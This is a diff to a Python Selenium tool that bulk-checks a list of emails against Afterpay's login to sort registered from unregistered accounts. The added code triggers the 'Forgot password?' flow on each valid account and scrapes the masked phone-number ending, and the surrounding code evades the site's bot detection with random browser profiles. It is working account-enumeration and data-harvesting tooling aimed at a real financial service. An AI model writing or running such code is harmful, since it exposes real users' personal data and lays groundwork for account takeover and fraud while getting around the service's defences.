@@ -6,6 +6,7 @@ Menggunakan list.txt untuk input email dan save ke valid.txt & invalid.txt
 """
 
 import time
+import re
 import subprocess
 import logging
 import threading
@@ -97,15 +98,30 @@ def classify_page(final_url: str, page_source: str):
     return False, True, False, 'fallback_invalid'
 
 
-def save_email_result(email, status, url=None):
+def save_email_result(email, status, url=None, phone_ending=None, verification_url=None, display=None):
     """Save email result to appropriate file"""
     try:
         if status == 'valid':
             filename = 'valid.txt'
-            message = f"✅ VALID - {email}\n"
+            # Prefer provided display string (single-line); otherwise build one from phone_ending
+            if display:
+                message = f"{display}\n"
+            else:
+                if phone_ending:
+                    # Extract digits from phone_ending and format as ***{digits}
+                    dig = re.search(r"(\d{1,})", phone_ending or '')
+                    if dig:
+                        mask = f"***{dig.group(1)}"
+                    else:
+                        # fallback without digits
+                        mask = phone_ending
+                    message = f"✅ VALID - {email} |  {mask}\n"
+                else:
+                    message = f"✅ VALID - {email}\n"
         else:
             filename = 'invalid.txt'
             message = f"❌ INVALID - {email}\n"
+            message += "---\n"
         
         with open(filename, 'a', encoding='utf-8') as f:
             f.write(message)
@@ -428,8 +444,9 @@ class AfterPayBatchValidator:
             except TimeoutException:
                 password_present = False
         
-        # Check final URL
+        # Check final URL (this is the validated page URL)
         final_url = self.driver.current_url
+        validated_page = final_url
         logger.debug(f"🌐 Final URL: {final_url}")
 
         # Also check page content for bot detection/corruption and classify result
@@ -496,19 +513,96 @@ class AfterPayBatchValidator:
         # Determine if valid/invalid
         # We already used classify_page; use its results
         
+        phone_ending = None
+        verification_page = None
         if is_valid:
             logger.info(f"✅ VALID: {email}")
+            # Try to click "Forgot password?" and record the masked phone number on the verification page
+            try:
+                # Only attempt this if we're on the password page or password field exists
+                if '/password' in (final_url or '').lower() or password_present:
+                    forgot_elem = None
+                    try:
+                        forgot_elem = self.driver.find_element(By.XPATH, "//a[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'forgot')]")
+                    except Exception:
+                        try:
+                            forgot_elem = self.driver.find_element(By.XPATH, "//button[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'forgot')]")
+                        except Exception:
+                            forgot_elem = None
+                    if forgot_elem:
+                        try:
+                            logger.debug("🔗 Clicking 'Forgot password?' link to reach verification page...")
+                            forgot_elem.click()
+                            # Wait for verification page or the text 'ending in' to appear
+                            WebDriverWait(self.driver, 10).until(lambda d: '/create-password-verify' in (d.current_url or '').lower() or 'ending in' in (d.page_source or '').lower())
+                            # Update final_url & verification_page
+                            # Update verification_page; keep validated_page as the original password page
+                            verification_page = self.driver.current_url
+                            # NOTE: Removed logging of the full verification page URL for privacy/verbosity
+                            # Attempt to find the masked phone number
+                            try:
+                                el = WebDriverWait(self.driver, 7).until(
+                                    EC.presence_of_element_located((By.XPATH, "//*[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'ending in') or contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'ending with')]") )
+                                )
+                                txt = el.text.strip() if el and hasattr(el, 'text') else ''
+                                # Extract masked part like '••• 05' or last digits if masked not present
+                                m = re.search(r'ending in\s*([•\*x\s\d]+)', txt, flags=re.I)
+                                if m:
+                                    phone_ending = m.group(1).strip()
+                                    logger.info(f"📱 Phone ending found: {phone_ending}")
+                                else:
+                                    # fallback to capture last digit group
+                                    dig = re.search(r'(\d{2,4})', txt)
+                                    if dig:
+                                        phone_ending = f"••• {dig.group(1)}"
+                            except TimeoutException:
+                                # fallback - attempt to parse from page source
+                                try:
+                                    ps = (self.driver.page_source or '').lower()
+                                    m2 = re.search(r'ending in\s*([•\*x\s\d]+)', ps, flags=re.I)
+                                    if m2:
+                                        phone_ending = m2.group(1).strip()
+                                    else:
+                                        d2 = re.search(r'(\d{2,4})', ps)
+                                        if d2:
+                                            phone_ending = f"••• {d2.group(1)}"
+                                            logger.info(f"📱 Phone ending found (fallback digits): {phone_ending}")
+                                except Exception:
+                                    pass
+                        except Exception as e:
+                            logger.debug(f"🔍 Could not click 'Forgot password?' or fetch verification info: {e}")
+            except Exception as e:
+                logger.debug(f"🔍 Error during 'Forgot password?' handling: {e}")
         else:
             logger.info(f"❌ INVALID: {email}")
         
         # Small delay to allow visual confirmation if user is watching
         time.sleep(1.0)
         
+        # Compute display string for GUI/file output
+        display = None
+        try:
+            if is_valid:
+                if phone_ending:
+                    digits = re.search(r"(\d{1,})", phone_ending or '')
+                    mask = f"***{digits.group(1)}" if digits else phone_ending
+                    display = f"✅ VALID - {email} |  {mask}"
+                else:
+                    display = f"✅ VALID - {email}"
+            else:
+                display = f"❌ INVALID - {email}"
+        except Exception:
+            display = f"✅ VALID - {email}" if is_valid else f"❌ INVALID - {email}"
+
         return {
             'email': email,
             'valid': is_valid,
-            'final_url': final_url,
-            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
+            'final_url': validated_page,
+            'validation_page': validated_page,
+            'verification_page': verification_page,
+            'phone_ending': phone_ending,
+            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
+            'display': display
         }
     
     def close(self):
@@ -926,7 +1020,10 @@ class AfterPayBatchProcessor:
                                     'valid': False,
                                     'final_url': f'DETECTION_ERROR: {str(bde)}',
                                     'error': f'Browser detected after {max_retries} retries',
-                                    'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
+                                    'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
+                                    'phone_ending': None,
+                                    'display': f"❌ INVALID - {email}"
+                                    ,'display': f"❌ INVALID - {email}"
                                 }
                                 break
                                 
@@ -956,7 +1053,9 @@ class AfterPayBatchProcessor:
                                     'valid': False,
                                     'final_url': f'RESTART_ERROR: {str(restart_e)}',
                                     'error': f'Could not restart browser after detection',
-                                    'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
+                                    'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
+                                    'phone_ending': None
+                                    ,'display': f"❌ INVALID - {email}"
                                 }
                                 break
                         except WebDriverException as wde:
@@ -990,7 +1089,9 @@ class AfterPayBatchProcessor:
                                     'valid': False,
                                     'final_url': f'ERROR: {str(wde)}',
                                     'error': str(wde),
-                                    'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
+                                    'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
+                                    'phone_ending': None
+                                    ,'display': f"❌ INVALID - {email}"
                                 }
                                 break
                             # ALWAYS use random profile for better detection avoidance
@@ -1037,7 +1138,9 @@ class AfterPayBatchProcessor:
                                 'valid': False,
                                 'final_url': 'TIMEOUT',
                                 'error': 'Timeout',
-                                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
+                                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
+                                'phone_ending': None
+                                ,'display': f"❌ INVALID - {email}"
                             }
                             break
                         except Exception as e:
@@ -1047,7 +1150,9 @@ class AfterPayBatchProcessor:
                                 'valid': False,
                                 'final_url': f'ERROR: {str(e)}',
                                 'error': str(e),
-                                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
+                                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
+                                'phone_ending': None
+                                ,'display': f"❌ INVALID - {email}"
                             }
                             break
 
@@ -1062,7 +1167,9 @@ class AfterPayBatchProcessor:
                             'valid': False,
                             'final_url': 'UNKNOWN',
                             'error': 'Unknown failure',
-                            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
+                            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
+                            'phone_ending': None
+                            ,'display': f"❌ INVALID - {email}"
                         }
 
                     # Store result
@@ -1070,7 +1177,14 @@ class AfterPayBatchProcessor:
                         self.results.append(result)
                     
                     # Save to file first
-                    save_email_result(result['email'], 'valid' if result['valid'] else 'invalid', result.get('final_url'))
+                    save_email_result(
+                        result['email'],
+                        'valid' if result['valid'] else 'invalid',
+                        result.get('final_url'),
+                        result.get('phone_ending'),
+                        result.get('verification_page'),
+                        result.get('display')
+                    )
                     
                     # IMPORTANT: Call progress callback to update GUI (including invalid list)
                     if self.progress_callback:
